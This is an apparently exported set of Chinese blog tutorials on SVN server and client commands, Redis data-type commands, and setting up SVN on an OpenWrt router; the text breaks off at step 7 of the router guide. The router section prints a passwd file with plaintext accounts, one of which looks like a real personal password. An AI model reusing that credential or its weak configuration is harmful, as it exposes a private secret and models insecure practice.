SVNService(删除之前最好先停止系统服务)<br>注意:该命令需要在具有管理员权限的窗口运行,win7、win8情况下”binpath=”后面需要跟一个空格。<br><img src="/images/version/svn/svn21.png" alt="效果图"><br><img src="/images/version/svn/svn22.png" alt="效果图"><br><img src="/images/version/svn/svn23.png" alt="删除效果图"></p></blockquote><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sc:<span class="built_in"> server </span>create</span><br><span class="line">binpath：二进制程序执行命令及路径</span><br><span class="line">--service: Windows<span class="built_in"> service </span>mode (Service Control Manager)</span><br><span class="line">-r: 顶级仓库目录</span><br><span class="line">start: 启动模式，auto自启动</span><br></pre></td></tr></table></figure><h4 id="SVN客户端命令"><a href="#SVN客户端命令" class="headerlink" title="SVN客户端命令"></a>SVN客户端命令</h4><h5 id="svn-checkout"><a href="#svn-checkout" class="headerlink" title="svn checkout"></a>svn checkout</h5><p>checkout,称为检出。其意义为:创建客户端指定目录与服务端指定仓库间的连接关系。客户端指定的这个目录，官方名称working copy，通常称为客户端连接目录。<br>一个客户端一般情况下，只需要检出一次。<br>A. 基于顶层仓库的checkout<br><img src="/images/version/svn/svn24.png" alt="效果图"><br>在任意目录下运行此命令：<br>svn checkout svn://localhost/sms d:/course/svn/group/aacof<br>其运行效果为,在aacof目录中出现一个.svn隐藏目录。<br><img src="/images/version/svn/svn25.png" alt="效果图"><br>svn checkout svn://localhost/sms<br>若当前执行命令的目录为Working Copy目录，则运行以下命令后的结果为:<br><img src="/images/version/svn/svn26.png" alt="效果图"><br>在working copy中会出现根仓库目录，而根仓库目录中会存在.svn隐藏目录。<br>B. 基于根仓库的checkout<br>基于根仓库的服务创建<br><img src="/images/version/svn/svn27.png" alt="效果图"><br>无论是在任意目录运行checkout，还是在working copy中运行checkout，其运行效果是相同的，都是在working copy目录中产生一个.svn的隐藏目录。<br><img src="/images/version/svn/svn28.png" alt="效果图"><br><img src="/images/version/svn/svn29.png" alt="效果图"></p><h5 id="服务端修改客户端权限"><a href="#服务端修改客户端权限" class="headerlink" title="服务端修改客户端权限"></a>服务端修改客户端权限</h5><p><img src="/images/version/svn/svn30.png" alt="效果图"></p><h5 id="svn-add"><a href="#svn-add" class="headerlink" title="svn add"></a>svn add</h5><p>A. add 文件<br>当一个文件/目录，被存放到working copy中时，SVN并不会感知到它的存在，即SVN并不会对其进行管理。若要SVN对其进行管理，必须将其通知add命令，添加到SVN管理中。需要注意，<br>(1) 被add的文件/目录，必须存在于woring copy中。<br>(2) add命令的作用就是将制定文件/目录交由SVN进行管理，所以一个文件/目录一般情况下，就执行一次add命令即可。add命令的执行与文件是否被修改过没有任何关系。<br>(3) 被add的目录，会将当前目录及其所包含的所有文件/目录，一次性<br><img src="/images/version/svn/svn31.png" alt="效果图"><br><img src="/images/version/svn/svn32.png" alt="效果图"><br>B. add 目录<br>add目录与add文件一样，即svn add 目录名</p><h5 id="svn-commit"><a href="#svn-commit" class="headerlink" title="svn commit"></a>svn commit</h5><p>commit命令用于将客户端working copy中所有对文件/目录的操作提交到服务端。<br><img src="/images/version/svn/svn33.png" alt="效果图"></p><h2 id="第3章-TortoiseSVN客户端"><a href="#第3章-TortoiseSVN客户端" class="headerlink" title="第3章 TortoiseSVN客户端"></a>第3章 TortoiseSVN客户端</h2><h2 id="第4章-Eclipse-SVN客户端"><a href="#第4章-Eclipse-SVN客户端" class="headerlink" title="第4章 Eclipse SVN客户端"></a>第4章 Eclipse SVN客户端</h2><h2 id="第5章-SVN与Apache服务整合"><a href="#第5章-SVN与Apache服务整合" class="headerlink" title="第5章 SVN与Apache服务整合"></a>第5章 SVN与Apache服务整合</h2>]]></content>
      <categories>
        <category>SVN</category>
      </categories>
      <tags>
        <tag>SVN</tag>
      </tags>
  </entry>
  <entry>
    <title>第3章 Redis数据类型操作命令</title>
    <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis/5d009d9f.html</url>
    <content><![CDATA[<h2 id="Redis数据类型操作命令"><a href="#Redis数据类型操作命令" class="headerlink" title="Redis数据类型操作命令"></a>Redis数据类型操作命令</h2><h3 id="字符串类型-string"><a href="#字符串类型-string" class="headerlink" title="字符串类型 (string)"></a>字符串类型 (string)</h3><p>字符串类型是Redis中最基本的数据类型，它能存储任何形式的字符串，包括二进制数据，序列化后的数据，JSON化的对象，甚至是一张图片。</p><h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><p>先测试能连接到redis服务器<br><img src="/images/redis/redis21.png" alt="Redis"></p><h5 id="set"><a href="#set" class="headerlink" title="set"></a>set</h5><p>将字符串值value设置到key中<br>语法:set key value<br><img src="/images/redis/redis42.png" alt="Redis"><br>查看已经插入的key<br><img src="/images/redis/redis43.png" alt="Redis"><br>向已经存在的key设置新的value，会覆盖原来的值</p><h5 id="get"><a href="#get" class="headerlink" title="get"></a>get</h5><p>获取key中设置的字符串值<br>语法:get key<br>例如:获取username这个key对应的value<br><img src="/images/redis/redis44.png" alt="Redis"></p><h5 id="incr"><a href="#incr" class="headerlink" title="incr"></a>incr</h5><p>将key中存储的数字值加1，如果key不存在，则key的值先被初始化为0再执行incr操作(只能对数字类型的数据操作)<br>语法: incr key<br>例1:操作key值增加1<br><img src="/images/redis/redis45.png" alt="Redis"><br>例2:对非数字的值操作是不行的<br><img src="/images/redis/redis46.png" alt="Redis"></p><h5 id="decr"><a href="#decr" class="headerlink" title="decr"></a>decr</h5><p>将key中存储的数字值减1，如果key不存在，那么key的值先被初始化为0再执行decr操作(只能对数字类型的数据操作)<br>语法: decr key<br>例1： 不存在的key，初始值为0，在减1。<br><img src="/images/redis/redis47.png" alt="Redis"><br>例2:对存在的数字值得key，减1。<br>先执行incr index，增加到3<br><img src="/images/redis/redis48.png" alt="Redis"><br>incr,decr在实现关注人数上，文章的点击数上。</p><h5 id="append"><a href="#append" class="headerlink" title="append"></a>append</h5><p>语法: append key value<br>说明: 如果key存在，则将value追加到key原来旧值得末尾<br>如果key不存在，则将key设置值为value<br>返回值: 追加字符串之后的总长度<br>例1:追加内容到存在的key<br><img src="/images/redis/redis49.png" alt="Redis"><br>例2:追加到不存在的key，同set key value<br><img src="/images/redis/redis50.png" alt="Redis"></p><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><h5 id="strlen"><a href="#strlen" class="headerlink" title="strlen"></a>strlen</h5><p>语法: strlen key<br>说明: 返回key所存储的字符串值的长度<br>返回值:<br>1) 如果key存在，返回字符串值的长度<br>2）如果key不存在，返回0</p><p>例1:计算存在key的字符串长度<br>设置中文set k4中文长度，按字符个数计算<br><img src="/images/redis/redis51.png" alt="Redis"><br>例2:计算不存在的key<br><img src="/images/redis/redis52.png" alt="Redis"></p><h5 id="getrange"><a href="#getrange" class="headerlink" title="getrange"></a>getrange</h5><p>语法:getrange key start end<br>作用:获取key中字符串值从start开始到end结束的字符串，包括start和end，负数表示从字符串的末尾开始，-1表示最后一个字符。<br>返回值:截取的字符串<br>使用的字符串 key:school, value:bjpowernode<br>例1:截取从2到5的字符串<br><img src="/images/redis/redis53.png" alt="Redis"><br>例2:从字符串尾部截取,start,end是负数,最后一位是-1<br><img src="/images/redis/redis54.png" alt="Redis"><br>例3:超出字符串范围的截取，获取合理的字符串。<br><img src="/images/redis/redis55.png" alt="Redis"></p><h5 id="setrange"><a href="#setrange" class="headerlink" title="setrange"></a>setrange</h5><p>语法: setrange key offset value<br>说明: 用value覆盖(替换)key的存储的值从offset开始，不存在的key做空白字符串。<br>返回值: 修改后的字符串的长度。<br>例1:替换给定的字符串<br><img src="/images/redis/redis56.png" alt="Redis"><br>例2:设置不存在的key<br><img src="/images/redis/redis57.png" alt="Redis"></p><h5 id="mset"><a href="#mset" class="headerlink" title="mset"></a>mset</h5><p>语法: mset key value[key value···]<br>说明: 同时设置一个或多个key-value对<br>返回值: OK<br>例1:一次设置多个key, value<br><img src="/images/redis/redis58.png" alt="Redis"></p><h5 id="mget"><a href="#mget" class="headerlink" title="mget"></a>mget</h5><p>语法: mget key[key ···]<br>作用: 获取所有(一个或多个)给定key的值<br>返回值: 包含所有key的列表</p><p>例1:返回多个key的存储值<br><img src="/images/redis/redis58.png" alt="Redis"><br>例2:返回不存在的key<br><img src="/images/redis/redis60.png" alt="Redis"></p><h3 id="哈希类型-hash"><a href="#哈希类型-hash" class="headerlink" title="哈希类型 hash"></a>哈希类型 hash</h3><p>redis hash是一个string类型的field和value的映射表，hash特别适合用于存储对象。</p><h4 id="基本命令-1"><a href="#基本命令-1" class="headerlink" title="基本命令"></a>基本命令</h4><h5 id="hset"><a href="#hset" class="headerlink" title="hset"></a>hset</h5><p>语法:hset hash表的key feld value<br>作用:将哈希表key中的域field的值设为vlaue，如果key不存在，则新建hash表，执行赋值，如果有field，则覆盖值。<br>返回值:<br>1) 如果field是hash表中新field，且设置值成功，返回1<br>2）如果field已经存在，旧值覆盖新值，返回0</p><p>例1：新的field<br><img src="/images/redis/redis61.png" alt="Redis"><br>例2：覆盖旧的field<br><img src="/images/redis/redis62.png" alt="Redis"></p><h5 id="hget"><a href="#hget" class="headerlink" title="hget"></a>hget</h5><p>语法: hget key field<br>作用: 获取哈希表key中给定域field的值<br>返回值: field域的值,如果key不存在或者field不存在返回nil<br>例1:获取存在key值得某个域的值<br><img src="/images/redis/redis63.png" alt="Redis"><br>例2:获取不存在的field<br><img src="/images/redis/redis64.png" alt="Redis"></p><h5 id="hmset"><a href="#hmset" class="headerlink" title="hmset"></a>hmset</h5><p>语法: hmset key field value [field value···]<br>说明: 同时将多个field-value（域-值）设置到哈希表key中，此命令会覆盖已经存在的field,hash表key不存在，创建空的hash表，执行hmset。<br>返回值:设置成功返回OK，如果失败返回一个错误。<br>例1:同时设置多个field-value<br><img src="/images/redis/redis65.png" alt="Redis"><br>使用redis-desktop-manager工具查看hash表，website的数据结构<br><img src="/images/redis/redis66.png" alt="Redis"><br>例2:key类型不是hash，产生错误。<br><img src="/images/redis/redis67.png" alt="Redis"></p><h5 id="hmget"><a href="#hmget" class="headerlink" title="hmget"></a>hmget</h5><p>语法: mhget key field[field ···]<br>作用: 获取哈希表key中一个或多个给定域的值<br>返回值: 返回和field顺序对应的值，如果field不存在，返回nil<br>例1:获取多个field的值<br><img src="/images/redis/redis68.png" alt="Redis"></p><h5 id="hgetall"><a href="#hgetall" class="headerlink" title="hgetall"></a>hgetall</h5><p>语法: hgetall key<br>作用: 获取哈希表key中所有的域和值<br>返回值:以列表形式返回hash中域和域的值，key不存在，返回空hash<br>例1:返回key对应的所有域和值<br><img src="/images/redis/redis69.png" alt="Redis"><br>例2:不存在的key，返回空列表<br><img src="/images/redis/redis70.png" alt="Redis"></p><h5 id="hdel"><a href="#hdel" class="headerlink" title="hdel"></a>hdel</h5><p>语法: hdel key field[field ···]<br>作用: 删除哈希表key中的一个或多个指定域field，不存在field直接忽略<br>返回值:成功删除的field的数量<br>例1:删除指定field<br><img src="/images/redis/redis71.png" alt="Redis"></p><h4 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h4><h5 id="hkeys"><a href="#hkeys" class="headerlink" title="hkeys"></a>hkeys</h5><p>语法: hkeys key<br>作用: 查看哈希表key中的所有field域<br>返回值: 包含所有field的列表，key不存在返回空列表<br>例1:查看website所有的域名称:<br><img src="/images/redis/redis72.png" alt="Redis"></p><h5 id="hvals"><a href="#hvals" class="headerlink" title="hvals"></a>hvals</h5><p>语法: hvals key<br>作用: 返回哈希表中所有域的值<br>返回值: 包含哈希表所有域值的列表,key不存在返回空列表。<br>例1:显示website哈希表所有域的值<br><img src="/images/redis/redis73.png" alt="Redis"></p><h5 id="hexists"><a href="#hexists" class="headerlink" title="hexists"></a>hexists</h5><p>语法: hexists key field<br>作用: 查看哈希表key中，给定域field是否存在<br>返回值: 如果field存在，返回1，其他返回0<br>例1:查看存在key中的field域是否存在<br><img src="/images/redis/redis74.png" alt="Redis"></p><h3 id="列表-list"><a href="#列表-list" class="headerlink" title="列表 list"></a>列表 list</h3><p>Redis列表是简单的字符串列表，按照插入顺序排序。你可以添加一个元素到列表的头部(左边)或者尾部(右边)</p><h4 id="基本命令-2"><a href="#基本命令-2" class="headerlink" title="基本命令"></a>基本命令</h4><h5 id="lpush"><a href="#lpush" class="headerlink" title="lpush"></a>lpush</h5><p>语法: lpush key value [value ···]<br>作用: 将一个或多个值value插入到列表key的表头(最左边)，从左边开始加入值，从左到右的顺序依次插入到表头<br>返回值: 数字，新列表的长度<br>例1:将a,b,c插入到mylist列表类型<br><img src="/images/redis/redis75.png" alt="Redis"><br>在redis-desktop-manager显示<br><img src="/images/redis/redis76.png" alt="Redis"><br>插入图示:<br><img src="/images/redis/redis77.png" alt="Redis"><br>例2:插入重复值到list列表类型<br><img src="/images/redis/redis78.png" alt="Redis"><br>在redis-desktop-manager显示<br><img src="/images/redis/redis79.png" alt="Redis"></p><h5 id="rpush"><a href="#rpush" class="headerlink" title="rpush"></a>rpush</h5><p>语法: rpush key value [value···]<br>作用: 将一个或多个值value插入到列表key的表尾(最右边)，各个value值按从左到右的顺序依次插入到表尾。<br>返回值: 数字,新列表的长度<br>例1: 插入多个值到列表<br><img src="/images/redis/redis80.png" alt="Redis"><br>在redis-desktop-manager显示<br><img src="/images/redis/redis81.png" alt="Redis"></p><h5 id="lrange"><a href="#lrange" class="headerlink" title="lrange"></a>lrange</h5><p>语法:lrange key start stop<br>作用:获取列表key中指定区间内的元素，0表示列表的第一个元素，以1表示列表的第二个元素；start，stop是列表的下标值，也可以负数的下标，-1表示列表的最后一个元素，-2表示列表的倒数第二个元素，以此类推。start,stop超出列表的范围不会出现错误。<br>例1:返回列表的全部内容<br><img src="/images/redis/redis82.png" alt="Redis"></p><h5 id="lindex"><a href="#lindex" class="headerlink" title="lindex"></a>lindex</h5><p>语法: lindex key index<br>作用: 获取列表key中下标为指定index的元素，列表元素不删除，只是查询。0表示列表的第一个元素，以1表示列表的第二个元素；start，stop是列表的下标值，也可以负数为下标，-1表示类别的最后一个元素，-2表列表的倒数第二个元素，一次类推。<br>返回值: 指定下标的元素；index不在列表范围，返回nil<br>例1:返回下标是1的元素<br><img src="/images/redis/redis83.png" alt="Redis"><br>例2:不存在的下标<br><img src="/images/redis/redis84.png" alt="Redis"></p><h5 id="llen"><a href="#llen" class="headerlink" title="llen"></a>llen</h5><p>语法: llen key<br>作用: 获取列表key的长度<br>返回值: 数值，列表的长度；key不存在返回0<br>例1:显示存在key的列表元素的个数<br><img src="/images/redis/redis85.png" alt="Redis"></p><h4 id="常用命令-2"><a href="#常用命令-2" class="headerlink" title="常用命令"></a>常用命令</h4><h5 id="lrem"><a href="#lrem" class="headerlink" title="lrem"></a>lrem</h5><p>语法: lrem key count value<br>作用: 根据参数count的值，溢出列表中与参数value相等的元素，count&gt;0,从列表的左侧向右开始移除；count&lt;0从列表的尾部开始移除;count=0移除表中所有与value相等的值。<br>返回值: 数值，移除的元素个数<br>例1:删除2个相同的列表元素<br><img src="/images/redis/redis86.png" alt="Redis"><br>例2:删除列表中所有的指定元素，删除所有的java<br><img src="/images/redis/redis87.png" alt="Redis"></p><h5 id="lset"><a href="#lset" class="headerlink" title="lset"></a>lset</h5><p>语法: lset key index value<br>作用: 将列表key下标为index的元素的值设置为value。<br>返回值: 设置成功返回OK；key不存在或者index超出范围返回错误信息。<br>例1:设置下标2的value为”c”<br><img src="/images/redis/redis88.png" alt="Redis"></p><h5 id="linsert"><a href="#linsert" class="headerlink" title="linsert"></a>linsert</h5><p>语法: linsert key BEFORE|ALFTER pivot value<br>作用: 将值value插入到列表key当中位于值pivot之前或之后的位置。key不存在，pivot不在列表中，不执行任何操作。<br>返回值: 命令执行成功，返回新列表的长度，没有找到pivot返回-1，key不存在返回0。<br>例1:修改列表arch，在值dao之前加入service<br><img src="/images/redis/redis89.png" alt="Redis"><br>例2:操作不存在的pivot<br><img src="/images/redis/redis90.png" alt="Redis"></p><h3 id="集合类型-set"><a href="#集合类型-set" class="headerlink" title="集合类型 set"></a>集合类型 set</h3><p>Redis的Set是string类型的无序集合，集合成员是唯一的，即集合中不能出现重复的数据</p><h4 id="基本命令-3"><a href="#基本命令-3" class="headerlink" title="基本命令"></a>基本命令</h4><h5 id="sadd"><a href="#sadd" class="headerlink" title="sadd"></a>sadd</h5><p>语法: sadd key member [member···]<br>作用: 将一个或多个member元素加入到集合key当中，已经存在于集合的member元素将被忽略，不会再加入。<br>返回值: 加入到集合的新元素的个数。不包括被忽略的元素。<br>例1:添加单个元素<br><img src="/images/redis/redis91.png" alt="Redis"><br>例2:添加多个元素<br><img src="/images/redis/redis92.png" alt="Redis"></p><h5 id="smembers"><a href="#smembers" class="headerlink" title="smembers"></a>smembers</h5><p>语法: smembers key<br>作用: 获取集合key中的所有成员元素，不存在的ky视为空集合<br>例1: 查看集合的所有元素<br><img src="/images/redis/redis93.png" alt="Redis"><br>例2: 查看不存在的集合<br><img src="/images/redis/redis94.png" alt="Redis"></p><h5 id="sismember"><a href="#sismember" class="headerlink" title="sismember"></a>sismember</h5><p>语法: sismember key member<br>作用: 判断member元素是否是集合key的成员<br>返回值: member是集合成员返回1，其他返回0。<br>例1: 检查元素是否存在集合中<br><img src="/images/redis/redis95.png" alt="Redis"></p><h5 id="scard"><a href="#scard" class="headerlink" title="scard"></a>scard</h5><p>语法: scard key<br>作用: 获取集合里面的元素的个数<br>返回值: 数字，key的元素个数。其他情况返回0。<br>例1: 统计集合的大小<br><img src="/images/redis/redis96.png" alt="Redis"><br>例2: 统计不存在的key<br><img src="/images/redis/redis97.png" alt="Redis"></p><h5 id="srem"><a href="#srem" class="headerlink" title="srem"></a>srem</h5><p>语法: srem key member [member···]<br>作用: 删除集合key中的一个或多个member元素，不存在的元素被忽略。<br>返回值: 数字，成功删除的元素个数，不包括被忽略的元素。<br>例1:删除存在的一个元素，返回数字1<br><img src="/images/redis/redis98.png" alt="Redis"><br>例2:删除不存在的元素<br><img src="/images/redis/redis99.png" alt="Redis"></p><h4 id="常用命令-3"><a href="#常用命令-3" class="headerlink" title="常用命令"></a>常用命令</h4><h5 id="srandmember"><a href="#srandmember" class="headerlink" title="srandmember"></a>srandmember</h5><p>语法: srandmember key[count]<br>作用: 只提供key，随机返回集合中一个元素，元素不删除，依然在集合中；提供了count时，count是正数，返回包含count个数元素的集合，集合元素各不相同。count是负数，返回一个count绝对值的长度的集合，集合中元素可能会重复多次。<br>返回值: 一个元素；多个元素的集合。<br>例1: 随机显示集合的一个元素<br><img src="/images/redis/redis100.png" alt="Redis"><br>例2: 使用count参数，count是正数<br><img src="/images/redis/redis101.png" alt="Redis"><br>例3: 使用count参数，count是负数<br><img src="/images/redis/redis102.png" alt="Redis"></p><h5 id="spop"><a href="#spop" class="headerlink" title="spop"></a>spop</h5><p>语法: spop key [count]<br>作用: 随机从集合中删除一个元素，count是删除的元素个数。<br>返回值: 被删除的元素，key不存在或空集合返回nil<br>例1: 随机从集合删除一个元素<br><img src="/images/redis/redis103.png" alt="Redis"><br>例2: 随机删除指定个数的元素<br><img src="/images/redis/redis104.png" alt="Redis"></p><h3 id="有序集合类型-zset-sorted-set"><a href="#有序集合类型-zset-sorted-set" class="headerlink" title="有序集合类型 zset (sorted set)"></a>有序集合类型 zset (sorted set)</h3><p>Redis有序集合zset和集合set一样也是string类型元素的集合，且不允许重复的成员。不同的是zset的每个元素都会关联一个分数(分数可以重复)，redis通过分数来为集合中的成员进行从小到大的排序。</p><h4 id="基本命令-4"><a href="#基本命令-4" class="headerlink" title="基本命令"></a>基本命令</h4><h5 id="zadd"><a href="#zadd" class="headerlink" title="zadd"></a>zadd</h5><p>语法: zadd key score member [score member···]<br>作用: 将一个或多个member元素及其score值加入到有序集合key中，如果member存在集合中，则更新值；score可以是整数或浮点数。<br>返回值: 数字，新添加的元素个数<br>例1: 创建保存学生成绩的集合<br><img src="/images/redis/redis105.png" alt="Redis"><br>例2: 使用浮点数作为scroe<br><img src="/images/redis/redis106.png" alt="Redis"></p><h5 id="zrange"><a href="#zrange" class="headerlink" title="zrange"></a>zrange</h5><p>语法: zrange key start stop [WITHSCORES]<br>作用: 查询有序集合，指定区间的内的元素。集合成员按score值从小到大来排序。start,stop都是从0开始。0是第一个元素，1是第二个元素，一次类推。以-1表示最后一个成员，-2表示倒数第二个成员。WITHSCORES选项让score和value一同返回。<br>返回值: 自定区间的成员集合<br>例1: 显示集合的全部元素，不显示score，不使用WITHSCORES<br><img src="/images/redis/redis107.png" alt="Redis"><br>例2: 显示集合全部元素，并使用WITHSCORES<br><img src="/images/redis/redis108.png" alt="Redis"><br>例3: 显示第0,1二个成员<br><img src="/images/redis/redis109.png" alt="Redis"><br>例4: 排序显示浮点数的score<br><img src="/images/redis/redis110.png" alt="Redis"></p><h5 id="zrevrange"><a href="#zrevrange" class="headerlink" title="zrevrange"></a>zrevrange</h5><p>语法: zrevrange key start stop [WITHSCORES]<br>作用: 返回有序集key中，指定区间内的成员。其中成员的位置按score值递减(从大到小)来排列。其它同zrange命令。<br>返回值: 自定区间的成员集合。<br>例1: 成绩榜<br><img src="/images/redis/redis111.png" alt="Redis"></p><h5 id="zrem"><a href="#zrem" class="headerlink" title="zrem"></a>zrem</h5><p>语法: zrem key member [member···]<br>作用: 删除有序集合key中的一个或多个成员，不存在的成员被忽略<br>返回值: 被成功删除的成员数量，不包括被忽略的成员。<br>例1: 删除指定一个成员wangwu<br><img src="/images/redis/redis112.png" alt="Redis"></p><h5 id="zcard"><a href="#zcard" class="headerlink" title="zcard"></a>zcard</h5><p>语法: zcard key<br>作用: 获取有序集key的元素成员的个数<br>返回值: key存在返回集合元素的个数，key不存在，返回0。<br>例1: 查询集合的元素个数<br><img src="/images/redis/redis113.png" alt="Redis"></p><h4 id="常用命令-4"><a href="#常用命令-4" class="headerlink" title="常用命令"></a>常用命令</h4><h5 id="zrangebyscore"><a href="#zrangebyscore" class="headerlink" title="zrangebyscore"></a>zrangebyscore</h5><p>语法: zrangebyscore key min max [WITHSCORES] [LIMIT offset count]<br>作用: 获取有序集key中，所有score值介于min和max之间(包括min和max)的成员，有序成员是按递增(从小到大)排序。min,max是包括在内，使用符合(表示不包括。min, max可以使用-inf， +inf表示最小和最大。 limit用来限制返回结果的数量和区间。 withsocres显示score和value。<br>返回值: 指定区间的集合数据。<br>使用的准备数据<br><img src="/images/redis/redis114.png" alt="Redis"><br>例1: 显示指定具体区间的数据<br><img src="/images/redis/redis115.png" alt="Redis"><br>例2: 显示指定具体区间的集合数据，开区间(不包括min,max)<br><img src="/images/redis/redis116.png" alt="Redis"><br>例3: 显示整个集合的所有数据<br><img src="/images/redis/redis117.png" alt="Redis"><br>例4: 使用limit<br>增加新的数据:<br><img src="/images/redis/redis118.png" alt="Redis"></p><p><img src="/images/redis/redis119.png" alt="Redis"><br>显示从第一个位置开始，取第一个元素。<br><img src="/images/redis/redis120.png" alt="Redis"></p><h5 id="zrevrangebyscore"><a href="#zrevrangebyscore" class="headerlink" title="zrevrangebyscore"></a>zrevrangebyscore</h5><p>语法: zrevrangebyscore key max min[WITHSCORES] [LIMIT offset count]<br>作用: 返回有序集key中，score值介于max和min之间(默认包括等于max或min)的所有的成员。有序集成员按score值递减(从大到小的次序排列)。其他同zrangebyscore<br>例1: 查询工资最高到3000之间的员工<br><img src="/images/redis/redis121.png" alt="Redis"></p><h5 id="zcount"><a href="#zcount" class="headerlink" title="zcount"></a>zcount</h5><p>语法: zcount key min max<br>作用: 返回有序集key中，score值在min和max之间(默认包括score值等于min或max)的成员的数量<br>例1: 求工资在3000-5000的员工数量<br><img src="/images/redis/redis122.png" alt="Redis"></p>]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>openwrt路由器搭建svn服务器</title>
    <url>/SVN/8f422d7f.html</url>
    <content><![CDATA[<h2 id="GL-MT300A-OpenWrt路由器安装svn服务"><a href="#GL-MT300A-OpenWrt路由器安装svn服务" class="headerlink" title="GL-MT300A OpenWrt路由器安装svn服务"></a>GL-MT300A OpenWrt路由器安装svn服务</h2><p>入手一款Gl-MT300A便携式迷你路由器，基于openWrt系统，想在上面搭建一个svn，测试方便以后添加硬盘或者内存卡使用，将搭建步骤记录如下，我将其分为以下七步：</p><p>1 . 使用SecureCrt连接到路由器。</p><p>2 . 安装subversion-server</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">opkg update    </span><br><span class="line">opkg install subversion-server</span><br></pre></td></tr></table></figure><p>3 . 安装完毕，使用svnserve –version查看版本，判断是否安装成功，然后创建第一个repository</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mkdir -p <span class="regexp">/mnt/</span>SVNRepositories<span class="regexp">/test/</span></span><br><span class="line">svnadmin create <span class="regexp">/mnt/</span>SVNRepositories<span class="regexp">/test/</span></span><br></pre></td></tr></table></figure><p>4 . 修改配置文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /mnt/SVNRepositories/test/conf/svnserve.conf</span><br><span class="line">内容修改为如下:</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## This file controls the configuration of the svnserve daemon, if you</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## use it to allow access to this repository.  (If you only allow</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## access through http: and/or file: URLs, then this file is</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## irrelevant.)</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## Visit http://subversion.apache.org/ for more information.</span></span></span><br><span class="line"></span><br><span class="line">[general]</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## These options control access to the repository for unauthenticated</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## and authenticated users.  Valid values are "write", "read",</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## and "none".  The sample settings below are the defaults.</span></span></span><br><span class="line">anon-access = read</span><br><span class="line">auth-access = write</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## The password-db option controls the location of the password</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## database file.  Unless you specify a path starting with a /,</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## the file's location is relative to the directory containing</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## this configuration file.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## If SASL is enabled (see below), this file will NOT be used.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## Uncomment the line below to use the default password file.</span></span></span><br><span class="line">password-db = passwd</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## The authz-db option controls the location of the authorization</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## rules for path-based access control.  Unless you specify a path</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## starting with a /, the file's location is relative to the the</span></span></span><br></pre></td></tr></table></figure><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">修改authz为如下:</span><br><span class="line"></span><br><span class="line">[aliases]                                                              </span><br><span class="line"><span class="meta"># joe = /C=XZ/ST=Dessert/L=Snake City/O=Snake Oil, Ltd./OU=Research Institute/CN=Joe Average</span></span><br><span class="line">                                                                                            </span><br><span class="line">[groups]                                                                                    </span><br><span class="line"><span class="meta"># harry_and_sally = harry,sally                                                             </span></span><br><span class="line"><span class="meta"># harry_sally_and_joe = harry,sally,&amp;joe                                                       </span></span><br><span class="line"><span class="meta"># [/foo/bar]                                                                                </span></span><br><span class="line"><span class="meta"># harry = rw                                                                                </span></span><br><span class="line"><span class="meta"># &amp;joe = r                                                                                  </span></span><br><span class="line"><span class="meta"># * =                                                                                       </span></span><br><span class="line">                                                                                            </span><br><span class="line">[/]                                                                                         </span><br><span class="line"><span class="meta">### user config                                                                             </span></span><br><span class="line">test = rw                                                                                 </span><br><span class="line">caifl = rw                                                                                                                                                                                                    </span><br><span class="line"><span class="meta"># [repository:/baz/fuz]                 </span></span><br><span class="line"><span class="meta"># @harry_and_sally = rw                 </span></span><br><span class="line"><span class="meta"># * = r</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改passwd如下:</span><br><span class="line"></span><br><span class="line">### This file is an example password file for svnserve.</span><br><span class="line">### Its format is similar to that of svnserve.conf. As shown in the</span><br><span class="line">### example below it contains one section labelled [users].</span><br><span class="line">### The name and password for each user follow, one account per line.</span><br><span class="line"></span><br><span class="line">[users]</span><br><span class="line"># harry = harryssecret</span><br><span class="line"># sally = sallyssecret</span><br><span class="line">### user password config</span><br><span class="line">test = test</span><br><span class="line">caifl = 19931129cfl</span><br></pre></td></tr></table></figure><p>5 . 进入目录/etc/config目录,修改文件subversion，配置本地仓库地址：vim /etc/confi/subversion</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">配置如下:</span><br><span class="line">root@GL-MT300A:/etc/config# vim subversion </span><br><span class="line"></span><br><span class="line">config subversion</span><br><span class="line">		### 本地仓库地址配置</span><br><span class="line">        option path     <span class="string">'/mnt/SVNRepositories/'</span>     </span><br><span class="line">        option<span class="built_in"> port </span>    <span class="string">'3690'</span></span><br></pre></td></tr></table></figure><p>6 . 启动或者停止svn服务:</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">启动<span class="symbol">:/etc/init</span>.d/subversion start</span><br><span class="line">停止<span class="symbol">:/etc/init</span>.d/subversion stop</span><br></pre></td></tr></table></figure><p>7 . 